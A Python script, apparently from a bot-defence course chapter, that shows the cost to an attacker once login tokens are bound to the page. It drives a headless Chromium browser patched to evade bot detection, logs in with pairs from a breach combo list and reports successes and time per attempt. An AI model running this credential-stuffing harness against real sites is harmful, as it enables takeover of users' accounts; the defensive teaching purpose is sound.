"""
Chapter 9, Round 4 debrief: the token farm (Section 9.7).

The purpose of this script is to show a COST, not a bypass. Once Round 4 refuses bare logins, the only way to
get a valid token without reimplementing the page is to run the page, so the attacker goes back to a real
browser (Patchright) for each login. That is the point of token binding: it drags the stuffer off 0.1 s HTTP
logins and back onto browsers, which cost orders of magnitude more per attempt. One browser build is one
fingerprint, so the cluster check still blocks the farm after a few failures.

It logs in with the first attempts of the breach list through the real login form and reports the
per-attempt cost next to the curl_cffi number from round4_stuffing.py --with-token.

Run:  python attacks/round4_token_farm.py [--attempts 7]
"""

import argparse
import json

from patchright.sync_api import sync_playwright

from _common import BASE_URL, CLAIM, Cost, browser_ctx, rng_for
from round1_patchright import patch_headless_chromium
from round4_stuffing import combo_list


def run(attempts=7):
    rng = rng_for("round4farm")
    combos = combo_list()[:attempts]
    statuses = []
    with Cost() as cost:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            for email, password in combos:
                ctx = browser_ctx(browser, "bot:round4_token_farm", CLAIM["chromium"], locale="en-US")
                page = ctx.new_page()
                patch_headless_chromium(ctx, page, browser.version)
                page.goto(BASE_URL + "/")
                page.goto(BASE_URL + "/login")
                page.fill("#login-form input[name=email]", email)
                page.fill("#login-form input[name=password]", password)
                with page.expect_navigation(timeout=30000) as nav:
                    page.click("#login-form button[type=submit]")
                statuses.append((nav.value.status, page.url.endswith('/account')))
                ctx.close()
            browser.close()
    return statuses, cost


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--attempts", type=int, default=7)
    statuses, cost = run(ap.parse_args().attempts)
    print(json.dumps({"attack": "round4_token_farm", "attempted": len(statuses),
                      "succeeded": sum(ok for _, ok in statuses), "http": [code for code, _ in statuses],
                      "wall_s": round(cost.wall_s, 2), "wall_s_per_attempt": round(cost.wall_s / max(1, len(statuses)), 2)}))
